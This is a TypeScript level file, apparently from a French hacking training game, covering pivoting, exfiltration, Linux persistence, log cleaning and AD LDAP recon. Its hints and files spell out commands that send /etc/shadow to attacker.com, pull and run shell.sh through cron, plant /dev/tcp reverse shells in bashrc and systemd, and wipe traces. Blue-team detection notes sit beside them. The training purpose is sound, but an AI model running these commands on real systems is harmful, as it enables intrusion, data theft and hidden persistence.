import type { Level } from './_types';

export const levels141_150: Level[] = [
  {
    id: 141,
    title: "Chisel — Tunneling TCP",
    difficulty: 'advanced',
    category: "Pivoting",
    objective: "Créer un tunnel TCP à travers un hôte compromis avec chisel",
    description: "`chisel` crée des tunnels TCP/HTTP rapides entre un client et un serveur. Le serveur écoute sur la machine de l'attaquant (`chisel server --port 8080 --reverse`), le client tourne sur l'hôte compromis (`chisel client attacker:8080 R:local_port:target:port`). Le mode reverse permet de traverser des pare-feux qui bloquent les connexions entrantes : c'est le compromis qui initie la connexion sortante. Chisel encapsule le TCP dans HTTP, ce qui passe souvent les proxies et IDS moins vigilants.",
    commands: ['chisel'],
    hints: [
      "Côté attaquant : chisel server --port 8080 --reverse --socks5 (active aussi le proxy SOCKS5)",
      "Côté pivot : chisel client 10.10.10.1:8080 R:socks (redirige tout via SOCKS5 sur le port 1080 de l'attaquant)",
      "Pour un port précis : chisel client attacker:8080 R:3389:192.168.10.5:3389 (RDP vers machine interne)"
    ],
    fileSystem: {
      'chisel_scenarios.txt': `=== SCÉNARIOS DE PIVOTING AVEC CHISEL ===

SCÉNARIO 1 — Accéder à un service RDP interne
  Topologie : Attaquant → [Internet] → DMZ (192.168.1.50) → [Réseau interne] → DC (10.0.0.10:3389)
  Attaquant :  chisel server --port 8080 --reverse
  Pivot (DMZ): chisel client 10.10.10.1:8080 R:3389:10.0.0.10:3389
  Résultat :   rdesktop localhost:3389 connecte au DC via le pivot

SCÉNARIO 2 — Proxy SOCKS5 pour scanner tout le réseau interne
  Attaquant :  chisel server --port 8080 --reverse --socks5
  Pivot :      chisel client attacker:8080 R:socks
  Résultat :   proxychains nmap -sT 10.0.0.0/24 passe par le pivot
  Config proxychains : socks5 127.0.0.1 1080

SCÉNARIO 3 — Double pivot (deux hops)
  Attaquant → Pivot1 (DMZ) → Pivot2 (interne) → Cible finale
  Pivot1 : chisel client attacker:8080 R:9090:127.0.0.1:9090
  Pivot2 : chisel client pivot1:9090 R:socks
  Résultat : tunnel chaîné sur deux segments réseau isolés

NOTES :
  - chisel compile en statique (Go) : facile à transférer sur la cible
  - --auth user:pass pour protéger le serveur
  - Trafic ressemble à du HTTP/WebSocket : discret`,
      'port_forwarding_comparison.txt': `=== COMPARAISON : CHISEL vs SSH TUNNELING vs SOCAT ===

CHISEL
  + Pas besoin de SSH sur la cible
  + Fonctionne en mode reverse (utile derrière un NAT/firewall)
  + Proxy SOCKS5 intégré
  + Binaire statique (Go), pas de dépendances
  - Doit être transféré sur la cible (détectable par AV)
  Exemple: chisel client attacker:8080 R:8888:internalhost:80

SSH TUNNELING
  + Natif sur Linux, souvent déjà présent
  + Chiffrement fort
  + Proxy SOCKS (-D) ou forwarding précis (-L/-R)
  - Nécessite accès SSH sur le pivot
  - Logs dans auth.log
  Exemple: ssh -L 8888:internalhost:80 user@pivot -N

SOCAT
  + Très flexible (TCP, UDP, Unix socket, SSL...)
  + Disponible sur la plupart des distros
  - Pas de chiffrement natif
  - Forwarding simple, pas de SOCKS
  - Bloqué si le trafic raw TCP est filtré
  Exemple: socat TCP-LISTEN:8888,fork TCP:internalhost:80

RECOMMANDATION :
  → SSH disponible ?          Utilise SSH tunneling
  → Accès shell sans SSH ?    Utilise chisel
  → Forwarding simple UDP ?   Utilise socat
  → Besoin SOCKS + NAT ?      Chisel ou SSH -D`
    },
    validation: [
      { type: 'command', value: 'chisel', description: 'Lancer chisel pour créer un tunnel' }
    ],
    story: "🔀 Tu as compromis un serveur en DMZ. Derrière lui, le réseau interne avec la base de données, le contrôleur de domaine, les serveurs de fichiers. Ton IP ne peut pas les atteindre directement — le firewall bloque tout. Chisel transforme ton pivot en passerelle silencieuse."
  },
  {
    id: 142,
    title: "ProxyChains — Routage via pivot",
    difficulty: 'advanced',
    category: "Pivoting",
    objective: "Router le trafic à travers un SOCKS proxy avec proxychains",
    description: "`proxychains` intercepte les appels réseau d'un programme et les route via une chaîne de proxys SOCKS/HTTP. La configuration dans `/etc/proxychains.conf` (ou `~/.proxychains/proxychains.conf`) définit les proxys et leur ordre. On peut chaîner plusieurs proxys pour du multi-hop (`dynamic_chain` ignore les proxys morts, `strict_chain` échoue si un proxy est down). Tout outil Linux peut ainsi parler au réseau interne via le pivot : `proxychains nmap`, `proxychains curl`, `proxychains python3`.",
    commands: ['proxychains'],
    hints: [
      "Édite /etc/proxychains.conf : change 'socks4 127.0.0.1 9050' en 'socks5 127.0.0.1 1080' (port de ton tunnel)",
      "proxychains nmap -sT -Pn 10.0.0.10 -p 22,80,443,3389 (scan TCP via le proxy, pas de -sS)",
      "proxychains curl http://10.0.0.10 (tester l'accès HTTP interne)"
    ],
    fileSystem: {
      'proxychains.conf': `# proxychains.conf — configuration type pour pivoting
# /etc/proxychains.conf

# Mode de chaînage
# dynamic_chain — saute les proxys morts (recommandé)
# strict_chain  — tous les proxys doivent répondre
# random_chain  — ordre aléatoire (anonymat)
dynamic_chain

# Proxy DNS via le tunnel (évite les fuites DNS)
proxy_dns

# Timeout en ms
tcp_read_time_out 15000
tcp_connect_time_out 8000

# Liste des proxys [type] [host] [port] [user] [pass]
[ProxyList]
# Proxy SOCKS5 local créé par chisel ou ssh -D
socks5 127.0.0.1 1080

# Exemple multi-hop (deux pivots) :
# socks5 127.0.0.1 1080   ← premier pivot
# socks5 127.0.0.1 1081   ← deuxième pivot (tunnel dans tunnel)`,
      'proxychains_usage.txt': `=== UTILISATION DE PROXYCHAINS ===

PRÉREQUIS : avoir un proxy SOCKS actif
  - chisel : chisel server --reverse --socks5  (port 1080)
  - SSH    : ssh -D 1080 user@pivot -N -f

COMMANDES COURANTES :

  # Scanner un hôte interne (TCP uniquement via SOCKS)
  proxychains nmap -sT -Pn -p- 10.0.0.10

  # Naviguer sur un site interne
  proxychains curl -s http://10.0.0.10/admin/

  # Lancer un exploit Metasploit via proxy
  proxychains msfconsole

  # Attaque par dictionnaire sur SSH interne
  proxychains hydra -l admin -P rockyou.txt ssh://10.0.0.5

  # Python requests via proxychains
  proxychains python3 exploit.py

LIMITES :
  - Pas de UDP (SOCKS5 le supporte mais peu d'outils)
  - Pas de ping (ICMP)
  - Pas de SYN scan nmap (-sS) → utiliser -sT
  - Performances réduites (double aller-retour réseau)

FUITES DNS :
  Activer proxy_dns dans proxychains.conf pour que
  les résolutions DNS passent aussi par le tunnel.`
    },
    validation: [
      { type: 'command', value: 'proxychains', description: 'Router le trafic via proxychains' }
    ],
    story: "🔗 ProxyChains est la colle qui unit tes outils habituels à ton tunnel. Pas besoin de reconfigurer nmap, curl ou hydra — proxychains intercepte leurs connexions et les fait passer par le pivot. Le réseau interne devient transparent."
  },
  {
    id: 143,
    title: "SSH Tunneling — SOCKS & Port Forwarding",
    difficulty: 'advanced',
    category: "Pivoting",
    objective: "Utiliser SSH pour créer des tunnels et des proxys SOCKS",
    description: "SSH intègre nativement trois modes de tunneling. `-L local_port:target:target_port` (local forward) : un port local redirige vers un service distant via le pivot. `-R remote_port:local:local_port` (remote forward) : expose un port local sur le serveur SSH distant. `-D port` (dynamic SOCKS proxy) : crée un proxy SOCKS sur le port local, tout le trafic est routé via le pivot. Combiné avec `-N` (pas de shell) et `-f` (background), SSH devient un proxy furtif complet.",
    commands: ['ssh'],
    hints: [
      "Proxy SOCKS5 : ssh -D 1080 user@pivot -N -f (puis configurer proxychains)",
      "Accéder à un port interne : ssh -L 8080:internalhost:80 user@pivot -N (puis curl localhost:8080)",
      "Reverse tunnel (pivot appelle l'attaquant) : ssh -R 2222:localhost:22 user@attacker -N"
    ],
    fileSystem: {
      'ssh_tunneling_guide.txt': `=== GUIDE COMPLET SSH TUNNELING ===

1. LOCAL PORT FORWARD (-L)
   Rend un service distant accessible localement.
   Syntaxe : ssh -L [local_port]:[target_host]:[target_port] user@pivot

   Exemple : accéder au MySQL interne (3306) depuis ta machine
   ssh -L 3306:10.0.0.5:3306 user@192.168.1.50 -N
   → mysql -h 127.0.0.1 -P 3306 -u root -p

2. REMOTE PORT FORWARD (-R)
   Expose un port local sur le serveur distant.
   Utile pour recevoir un reverse shell depuis un réseau isolé.
   ssh -R 4444:127.0.0.1:4444 user@attacker -N
   → la cible peut maintenant envoyer un shell sur attacker:4444

3. DYNAMIC SOCKS PROXY (-D)
   Crée un proxy SOCKS sur un port local.
   Tout le trafic routé via ce port passe par le pivot.
   ssh -D 1080 user@pivot -N -f
   → proxychains nmap 10.0.0.0/24

OPTIONS UTILES :
   -N  : pas de commande shell (tunnel only)
   -f  : passer en background après authentification
   -C  : compression (réseau lent)
   -q  : silencieux (moins de logs)
   -o StrictHostKeyChecking=no  : accepte les clés inconnues
   -o ServerAliveInterval=60    : keepalive

PERSISTANCE :
   autossh -D 1080 -M 0 user@pivot -N  (reconnexion auto)`,
      'tunnel_scenarios.txt': `=== SCÉNARIOS SSH TUNNELING (ASCII) ===

SCÉNARIO A — Local Forward : accès RDP interne
  [Attaquant:3389] ←── ssh -L ──→ [Pivot:22] ──→ [DC:3389]

  Attaquant$ ssh -L 3389:10.0.0.10:3389 user@pivot.dmz -N -f
  Attaquant$ rdesktop localhost:3389

  ┌──────────────┐    SSH tunnel    ┌──────────┐    TCP    ┌──────────┐
  │ Attaquant    │ ════════════════>│  Pivot   │ ─────────>│    DC    │
  │ :3389 local  │                  │ DMZ      │           │ :3389    │
  └──────────────┘                  └──────────┘           └──────────┘

SCÉNARIO B — Dynamic SOCKS : scanner tout le réseau interne
  [Attaquant:1080/SOCKS] ←── ssh -D ──→ [Pivot] ──→ [10.0.0.0/24]

  Attaquant$ ssh -D 1080 user@pivot -N -f
  Attaquant$ proxychains nmap -sT 10.0.0.0/24

  ┌──────────────┐    SSH (-D)    ┌──────────┐    any port    ┌──────────────┐
  │ proxychains  │ ══════════════>│  Pivot   │ ──────────────>│ Réseau interne│
  │ nmap/curl/.. │                │          │                │ 10.0.0.0/24  │
  └──────────────┘                └──────────┘                └──────────────┘

SCÉNARIO C — Remote Forward : reverse shell depuis réseau isolé
  [Attaquant:4444] ←── ssh -R ─── [Pivot dans réseau isolé]

  Pivot$      ssh -R 4444:127.0.0.1:4444 attacker_ip -N
  Attaquant$  nc -lvnp 4444  (reçoit le shell)

  Note : le pivot initie la connexion SSH → traverse le firewall sortant`
    },
    validation: [
      { type: 'command', value: 'ssh', description: 'Créer un tunnel SSH' }
    ],
    story: "🛡️ SSH est l'outil de tunneling le plus universel. Déjà présent sur presque tous les Linux, aucun binaire à transférer. -L, -R, -D : trois modes qui couvrent 90% des besoins de pivoting dans un vrai pentest."
  },
  {
    id: 144,
    title: "Multi-hop Pivoting",
    difficulty: 'advanced',
    category: "Pivoting",
    objective: "Traverser plusieurs réseaux via un pivot multi-hop",
    description: "Le multi-hop pivoting chaîne plusieurs tunnels pour traverser des réseaux isolés successifs. SSH ProxyJump (`-J hop1,hop2`) automatise la connexion à travers plusieurs bastions. ProxyChains avec plusieurs entrées dans `[ProxyList]` chaîne les tunnels SOCKS. La complexité augmente avec chaque hop mais c'est indispensable pour atteindre des cibles profondément enfouies dans une infrastructure.",
    commands: ['ssh', 'proxychains'],
    hints: [
      "ProxyJump direct : ssh -J user@dmz_host user@internal_host (SSH saute automatiquement via dmz_host)",
      "Double hop : ssh -J user@hop1,user@hop2 user@target (chaîne deux bastions)",
      "Combiner tunnels SOCKS : créer un tunnel sur hop1 (port 1080), puis un second sur hop2 (port 1081), chaîner dans proxychains.conf"
    ],
    fileSystem: {
      'multihop_diagram.txt': `=== DIAGRAMME MULTI-HOP PIVOTING ===

INFRASTRUCTURE CIBLE :

  [INTERNET]
      │
      │ accès direct
      ▼
  ┌─────────────────────────────┐
  │  PIVOT 1 — Serveur DMZ      │  192.168.1.50
  │  (compromis via exploit web)│
  └─────────────────────────────┘
      │ réseau interne 10.10.10.0/24
      ▼
  ┌─────────────────────────────┐
  │  PIVOT 2 — Serveur interne  │  10.10.10.20
  │  (compromis via credential) │
  └─────────────────────────────┘
      │ réseau DB 172.16.0.0/24
      ▼
  ┌─────────────────────────────┐
  │  CIBLE — Serveur de base de │  172.16.0.5
  │  données (PostgreSQL 5432)  │
  └─────────────────────────────┘

MÉTHODE 1 — SSH ProxyJump (la plus simple)
  ssh -J user@192.168.1.50,user@10.10.10.20 user@172.16.0.5

  Pour accéder au port DB :
  ssh -J user@192.168.1.50,user@10.10.10.20 -L 5432:172.16.0.5:5432 user@10.10.10.20 -N

MÉTHODE 2 — Chisel chaîné
  Attaquant : chisel server --port 8080 --reverse --socks5
  Pivot1 :    chisel client attacker:8080 R:1080:socks
  Pivot2 :    proxychains chisel client attacker:8080 R:1081:socks
  Attaquant : configure proxychains avec socks5 :1080 PUIS socks5 :1081

MÉTHODE 3 — SSH -D en cascade
  Étape 1: ssh -D 1080 user@pivot1 -N -f
  Étape 2: proxychains ssh -D 1081 user@pivot2 -N -f
  Résultat: proxychains.conf liste 1080 puis 1081
            tout trafic traverse les deux pivots en séquence`,
      'multihop_config.txt': `=== CONFIGURATION PROXYCHAINS MULTI-HOP ===

/etc/proxychains.conf pour double pivot :

  strict_chain

  proxy_dns

  [ProxyList]
  socks5  127.0.0.1  1080   # Tunnel vers Pivot1
  socks5  127.0.0.1  1081   # Tunnel vers Pivot2 (via Pivot1)

CONFIGURATION SSH (~/.ssh/config) :

  Host pivot1
    HostName 192.168.1.50
    User pentester
    IdentityFile ~/.ssh/id_rsa

  Host pivot2
    HostName 10.10.10.20
    User admin
    ProxyJump pivot1

  Host target-db
    HostName 172.16.0.5
    User postgres
    ProxyJump pivot2

  # Utilisation : ssh target-db (SSH gère tout automatiquement)

VÉRIFICATION DE CONNECTIVITÉ :
  proxychains curl http://172.16.0.5/    # Tester l'accès HTTP
  proxychains nc -zv 172.16.0.5 5432     # Tester un port TCP
  proxychains nmap -sT -Pn 172.16.0.5   # Scanner la cible finale`
    },
    validation: [
      { type: 'command', value: 'ssh', description: 'Utiliser SSH ProxyJump pour multi-hop' }
    ],
    story: "🗺️ Tu as pénétré la DMZ. Puis le réseau interne. Maintenant il faut atteindre le serveur de base de données dans un troisième réseau isolé. Chaque hop est un escalier vers le noyau de l'infrastructure. ProxyJump rend ça presque élégant."
  },
  {
    id: 145,
    title: "Exfiltration de données",
    difficulty: 'advanced',
    category: "Post-Exploitation",
    objective: "Techniques d'exfiltration de données depuis un système compromis",
    description: "L'exfiltration est le transfert non autorisé de données depuis une cible compromise vers un serveur contrôlé par l'attaquant. Les techniques varient selon les contraintes réseau : HTTP/HTTPS (passe la plupart des proxies), DNS (exfiltration ultra-discrète en encodant dans des requêtes DNS), ICMP (cache dans les pings), ou Netcat sur un port ouvert. L'encodage base64 et la compression tar permettent de préparer les données, tandis que le chiffrement masque le contenu aux systèmes DLP.",
    commands: ['curl', 'base64', 'tar', 'nc'],
    hints: [
      "Exfil HTTP simple : tar czf - /etc/passwd /etc/shadow | base64 | curl -s -X POST -d @- http://attacker/receive",
      "Exfil Netcat : tar czf - /home/user/documents/ | nc attacker_ip 4444 (réception: nc -lvnp 4444 > data.tar.gz)",
      "Encoder avant d'envoyer : base64 secret.txt | curl -s http://attacker/collect?d=$(cat -)"
    ],
    fileSystem: {
      'exfil_techniques.txt': `=== 5 TECHNIQUES D'EXFILTRATION DE DONNÉES ===

MÉTHODE 1 — HTTP POST (le plus simple)
  Avantage : passe les firewalls (port 80/443)
  Commande :
    curl -X POST http://attacker.com/collect \
         -F "file=@/etc/passwd" \
         -F "hostname=$(hostname)"

  Avec archive chiffrée :
    tar czf - /data/sensitive/ | \
    openssl enc -aes-256-cbc -pass pass:secret | \
    curl -X POST http://attacker.com/upload --data-binary @-

MÉTHODE 2 — DNS Exfiltration (la plus discrète)
  Encode les données dans des sous-domaines DNS
  Les requêtes DNS sortent souvent même avec un proxy très restrictif

  # Encoder un fichier en chunks de 50 chars base32
  cat /etc/passwd | base64 | tr -d '=' | fold -w 50 | while read line; do
    host "\${line}.exfil.attacker.com" > /dev/null 2>&1
  done

  Sur le serveur attaquant :
    tcpdump -i eth0 -w dns.pcap 'port 53'  # capturer les requêtes

MÉTHODE 3 — Netcat
  Réception (attaquant d'abord) :
    nc -lvnp 4444 > stolen_data.tar.gz
  Envoi (depuis la cible) :
    tar czf - /home/ | nc attacker_ip 4444

MÉTHODE 4 — ICMP (ping) Tunneling
  Encode dans le payload des paquets ICMP
  Outil : icmpsh ou nping
    nping --icmp --icmp-type echo attacker_ip \
          --data-string "$(base64 /etc/passwd | head -1)"

MÉTHODE 5 — Exfil via champ User-Agent HTTP
  Encode dans les headers HTTP (contournement DLP basique)
    curl -A "Mozilla/$(base64 /etc/passwd | head -c 100)" \
         http://attacker.com/`,
      'detection_bypass_notes.txt': `=== CONTOURNEMENT DE DÉTECTION (DÉFENSE & COMPRÉHENSION) ===

COMMENT LES BLUE TEAMS DÉTECTENT L'EXFILTRATION :
  1. Volume anormal de données sortantes (DLP threshold)
  2. Requêtes DNS inhabituelles (longueur, fréquence, entropie élevée)
  3. Connexions HTTP vers IPs non répertoriées
  4. Uploads volumineux vers l'extérieur
  5. Processus réseau inhabituels (nc, curl par des users non-root)
  6. Horaires suspects (3h du matin)

TECHNIQUES POUR RALENTIR LA DÉTECTION :
  Fragmentation temporelle (slow exfil) :
    for chunk in ...; do
      curl -s http://attacker.com/collect -d "$chunk"
      sleep $((RANDOM % 60 + 30))   # attendre entre 30 et 90s
    done

  Chiffrement du trafic :
    openssl enc -aes-256-cbc masque le contenu (pas le volume)

  Utiliser des domaines légitimes :
    curl -X POST "https://api.github.com/gists" (données dans un gist public)
    Ou Pastebin, Slack webhooks, Google Forms...

POUR LES BLUE TEAMS — CE QU'IL FAUT MONITORER :
  - Pic de requêtes DNS (> 50/min depuis un host)
  - Sous-domaines avec entropie élevée (base64/hex)
  - Taille des paquets ICMP anormale (> 64 bytes payload)
  - curl/wget lancé par des processus inattendus`
    },
    validation: [
      { type: 'command', value: 'curl', description: 'Utiliser curl pour exfiltrer des données' }
    ],
    story: "📦 Tu as les fichiers de conf, la base de données, les clés SSH. Comment les ramener sans déclencher les alertes DLP ? DNS exfil passe là où HTTP est bloqué. ICMP passe là où TCP est filtré. Connais ces techniques pour mieux les détecter."
  },
  {
    id: 146,
    title: "Persistance — Backdoors Linux",
    difficulty: 'advanced',
    category: "Post-Exploitation",
    objective: "Comprendre les mécanismes de persistance sur Linux",
    description: "La persistance garantit qu'un accès compromis survit aux redémarrages, changements de mots de passe ou déconnexions. Les mécanismes vont du simple cron job au service systemd en passant par l'injection dans les fichiers de profil shell. Chaque technique laisse des traces différentes, et comprendre ces méthodes est essentiel tant pour l'attaque que pour la réponse à incident — un Blue Teamer qui ne connaît pas les backdoors ne les trouvera jamais.",
    commands: ['crontab', 'cat', 'echo'],
    hints: [
      "Cron backdoor discret : (crontab -l 2>/dev/null; echo '*/5 * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1') | crontab -",
      "Clé SSH ajoutée : echo 'ssh-rsa AAAA...attacker_key' >> ~/.ssh/authorized_keys (accès sans mot de passe)",
      "Vérifier les backdoors existants : crontab -l; cat ~/.bashrc; find / -perm -4000 2>/dev/null (SUID)"
    ],
    fileSystem: {
      'persistence_techniques.txt': `=== 6 MÉCANISMES DE PERSISTANCE LINUX ===

1. CRONTAB BACKDOOR
   Exécution périodique d'un reverse shell

   # Ajout discret (ne détruit pas les crons existants)
   (crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://attacker/shell.sh | bash') | crontab -

   # Cron système (root requis)
   echo '* * * * * root /tmp/.hidden/backdoor' >> /etc/cron.d/backup-job

   Détection : crontab -l -u user ; ls /etc/cron.*

2. ~/.BASHRC / ~/.PROFILE INJECTION
   Exécuté à chaque connexion de l'utilisateur

   echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> ~/.bashrc

   Discret : obfusquer avec base64
   echo 'eval $(echo YmFzaC...base64...|base64 -d)' >> ~/.profile

   Détection : diff ~/.bashrc /etc/skel/.bashrc

3. SSH AUTHORIZED_KEYS
   Accès SSH permanent sans mot de passe

   mkdir -p ~/.ssh && chmod 700 ~/.ssh
   echo 'ssh-rsa AAAA...ATTACKER_KEY...' >> ~/.ssh/authorized_keys
   chmod 600 ~/.ssh/authorized_keys

   Détection : cat ~/.ssh/authorized_keys

4. SUID BACKDOOR
   Copier bash avec bit SUID (root requis)

   cp /bin/bash /tmp/.systemd-bash
   chmod +s /tmp/.systemd-bash
   Utilisation : /tmp/.systemd-bash -p  (shell root)

   Détection : find / -perm -4000 -type f 2>/dev/null

5. SYSTEMD SERVICE
   Service persistant qui démarre au boot

   cat > /etc/systemd/system/system-monitor.service << EOF
   [Unit]
   Description=System Monitor
   After=network.target
   [Service]
   ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
   Restart=always
   RestartSec=60
   [Install]
   WantedBy=multi-user.target
   EOF
   systemctl enable system-monitor

   Détection : systemctl list-units --type=service | grep -v standard

6. /ETC/RC.LOCAL
   Exécuté au démarrage du système (legacy mais efficace)

   echo '/tmp/.backdoor &' >> /etc/rc.local
   chmod +x /etc/rc.local

   Détection : cat /etc/rc.local ; ls -la /etc/rc.local`,
      'blue_team_detection.txt': `=== GUIDE BLUE TEAM — DÉTECTER LA PERSISTANCE ===

CHECKLIST DE RÉPONSE À INCIDENT :

1. CRONS
   crontab -l -u root
   crontab -l -u www-data
   ls -la /etc/cron.* /var/spool/cron/
   grep -r "bash -i\|/dev/tcp\|curl.*|.*bash" /etc/cron* 2>/dev/null

2. SHELL PROFILES
   for user in $(cut -d: -f1 /etc/passwd); do
     echo "=== $user ===" && cat /home/$user/.bashrc 2>/dev/null
   done
   diff /root/.bashrc /etc/skel/.bashrc

3. SSH KEYS
   find /home /root -name "authorized_keys" -exec cat {} \;
   # Comparer avec les clés légitimes connues

4. SUID/SGID BINAIRES
   find / -perm /6000 -type f 2>/dev/null | grep -v '^/usr\|^/bin\|^/sbin'
   # Tout ce qui n'est pas dans les packages installés est suspect

5. SERVICES SYSTEMD
   systemctl list-units --type=service --state=active
   systemctl list-unit-files --state=enabled
   find /etc/systemd /lib/systemd -name "*.service" -newer /boot 2>/dev/null

6. PROCESSUS RÉSEAU SUSPECTS
   ss -tnlp (ports en écoute)
   ss -tnp  (connexions établies)
   netstat -tnp | grep ESTABLISHED

7. OUTILS AUTOMATISÉS
   chkrootkit : détecte rootkits courants
   rkhunter   : rootkit hunter
   Lynis      : audit de sécurité complet`
    },
    validation: [
      { type: 'command', value: 'crontab', description: 'Examiner ou modifier les crontabs' }
    ],
    story: "🕳️ L'accès initial c'est bien. Le garder c'est mieux. Un bon pentest teste aussi la persistance — et un bon défenseur vérifie ces 6 emplacements après tout incident. Les backdoors se cachent là où personne ne regarde."
  },
  {
    id: 147,
    title: "Nettoyage des traces",
    difficulty: 'advanced',
    category: "Post-Exploitation",
    objective: "Effacer les traces d'une intrusion (et comprendre comment les détecter)",
    description: "Après une intrusion, les traces se trouvent dans les logs système, l'historique des commandes, les fichiers temporaires et les métadonnées de fichiers. `HISTFILE=/dev/null` empêche l'enregistrement des commandes, `shred` écrase les fichiers avant suppression (contrairement à `rm` qui laisse les données récupérables). Manipuler les timestamps (`touch -t`) complique la forensique. Cette connaissance est essentielle pour comprendre ce qu'un attaquant essaie d'effacer — et pourquoi les logs centralisés (SIEM) sont critiques.",
    commands: ['history', 'shred', 'find'],
    hints: [
      "Désactiver l'historique pour la session courante : unset HISTFILE; export HISTSIZE=0 (ne supprime pas l'historique passé)",
      "Effacer de manière sécurisée : shred -uzn 3 fichier_sensible.txt (-u supprime, -z écrit des zéros, -n 3 = 3 passes)",
      "Trouver les fichiers récents pour identifier les traces : find / -newer /tmp -mtime -1 -type f 2>/dev/null"
    ],
    fileSystem: {
      'log_locations.txt': `=== EMPLACEMENTS DES LOGS LINUX ET LEUR CONTENU ===

/var/log/auth.log (Debian/Ubuntu) ou /var/log/secure (RHEL/CentOS)
  → Connexions SSH, sudo, su, échecs d'authentification
  → Contient : timestamps, utilisateurs, IPs source, méthode auth

/var/log/syslog ou /var/log/messages
  → Logs système généraux
  → Démarrage de services, erreurs kernel, cron jobs

/var/log/apache2/access.log ou /var/log/nginx/access.log
  → Toutes les requêtes HTTP
  → IP client, URL, code réponse, User-Agent, taille

/var/log/apache2/error.log
  → Erreurs 404, 500, tentatives d'exploitation

/var/log/wtmp (binaire)
  → Historique de TOUTES les connexions
  → Lire avec : last (ou utmpdump /var/log/wtmp)

/var/log/btmp (binaire)
  → Tentatives de connexion ÉCHOUÉES
  → Lire avec : lastb

/var/run/utmp (binaire)
  → Utilisateurs ACTUELLEMENT connectés
  → Lire avec : who ou w

~/.bash_history (ou zsh_history, fish history)
  → Historique des commandes de l'utilisateur
  → HISTFILE pointe vers ce fichier

/var/log/cron ou /var/log/cron.log
  → Exécution des tâches cron

/var/log/dpkg.log ou /var/log/yum.log
  → Packages installés/désinstallés

/tmp/ et /var/tmp/
  → Fichiers temporaires, souvent utilisés par les attaquants

/proc/[pid]/
  → Informations sur les processus en cours
  → /proc/[pid]/exe → binaire exécuté
  → /proc/[pid]/net/tcp → connexions réseau du process`,
      'forensic_detection.txt': `=== FORENSIQUE : CE QUI RESTE MALGRÉ LE NETTOYAGE ===

LIMITES DU NETTOYAGE CÔTÉ ATTAQUANT :

1. LOGS CENTRALISÉS (SIEM)
   Si les logs sont envoyés en temps réel vers un SIEM (Splunk, ELK),
   effacer /var/log/auth.log n'efface pas les copies distantes.
   → Raison principale d'utiliser un SIEM !

2. MÉTADONNÉES FILESYSTEM
   inode mtime (modification), atime (accès), ctime (changement d'attributs)
   ctime NE PEUT PAS être falsifié par un utilisateur non-root en conditions normales.
   Commande : stat fichier.txt  (affiche les 3 timestamps)
   touch -t 202401010000 fichier  # Falsifier mtime/atime seulement

3. JOURNALD (systemd)
   /run/log/journal/ (RAM, perdu au reboot)
   /var/log/journal/ (persistant si configuré)
   journalctl --since "2 hours ago"
   Plus difficile à manipuler que les fichiers texte

4. AUDIT FRAMEWORK (auditd)
   Si auditd est actif, CHAQUE appel système est loggé.
   /var/log/audit/audit.log → enregistre même les fichiers supprimés
   aureport --summary   # rapport d'audit

5. MÉMOIRE VOLATILE
   Processus, connexions réseau, clés de chiffrement → dans la RAM
   Dump mémoire = forensique avancée (Volatility Framework)

COMMANDES FORENSIQUES BLUE TEAM :
   last -F               # connexions avec timestamps complets
   lastb                 # tentatives échouées
   who -a                # sessions actuelles
   ausearch -ua root     # activité root via auditd
   journalctl -xe        # dernières entrées système
   find / -atime -1 -type f 2>/dev/null  # fichiers accédés dans la dernière heure`
    },
    validation: [
      { type: 'command', value: 'shred', description: 'Effacer un fichier avec shred' }
    ],
    story: "🧹 Un attaquant sait effacer ses traces. Un défenseur sait que certaines traces ne peuvent pas être effacées. Les logs centralisés, auditd, et la mémoire RAM gardent des secrets que même un rm -rf ne peut pas effacer."
  },
  {
    id: 148,
    title: "LDAP & Active Directory Recon",
    difficulty: 'advanced',
    category: "Post-Exploitation",
    objective: "Enumérer un domaine Active Directory via LDAP",
    description: "`ldapsearch` interroge un annuaire LDAP (dont Active Directory). Les requêtes LDAP permettent d'énumérer utilisateurs, groupes, ordinateurs, et de repérer les comptes privilégiés ou Kerberoastables. En environnement Windows/AD, les DCs exposent LDAP sur le port 389 (non chiffré) et 636 (LDAPS). `-x` = simple bind (anonyme ou avec creds), `-b` = base DN, `-s sub` = recherche récursive.",
    commands: ['ldapsearch'],
    hints: [
      "Enumérer les utilisateurs : ldapsearch -h 10.0.0.10 -x -b 'DC=domain,DC=local' '(objectClass=person)' sAMAccountName",
      "Trouver les admins du domaine : ldapsearch -h DC_IP -x -D 'user@domain.local' -w 'password' -b 'DC=domain,DC=local' '(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local)'",
      "Comptes Kerberoastables (SPN défini) : ldapsearch -h DC_IP -x -D 'user@domain.local' -w pass -b 'DC=domain,DC=local' '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName"
    ],
    fileSystem: {
      'ad_recon_guide.txt': `=== GUIDE RECONNAISSANCE ACTIVE DIRECTORY AVEC LDAP ===

CONNEXION AU CONTRÔLEUR DE DOMAINE :
  Anonyme (si autorisé) :
    ldapsearch -h 10.0.0.10 -x -b "DC=domain,DC=local" "(objectClass=*)"

  Avec credentials :
    ldapsearch -h 10.0.0.10 -x \
               -D "john.doe@domain.local" -w "Password123" \
               -b "DC=domain,DC=local" "(objectClass=person)"

REQUÊTES UTILES :

  # Tous les utilisateurs
  (objectClass=user)
  Attributs utiles : sAMAccountName, mail, description, memberOf, lastLogon

  # Groupes et membres
  (objectClass=group)
  Attributs : cn, member, description

  # Ordinateurs du domaine
  (objectClass=computer)
  Attributs : cn, operatingSystem, operatingSystemVersion

  # Admins du domaine
  (memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local)

  # Comptes avec SPN (Kerberoastables)
  (&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))

  # Comptes avec "password never expires"
  (&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))

  # Comptes désactivés
  (&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))

EXEMPLE COMPLET :
  ldapsearch -h 192.168.1.10 -x \
             -D "john@corp.local" -w "Summer2024!" \
             -b "DC=corp,DC=local" \
             "(&(objectClass=user)(servicePrincipalName=*))" \
             sAMAccountName servicePrincipalName \
             | grep -E "sAMAccountName|servicePrincipalName"

FORMAT DN (Distinguished Name) :
  CN=Jean Dupont,OU=IT,OU=Users,DC=corp,DC=local
  │               │         │            └─ domaine
  │               │         └─ unité organisationnelle parente
  │               └─ unité organisationnelle
  └─ nom commun (CN)`,
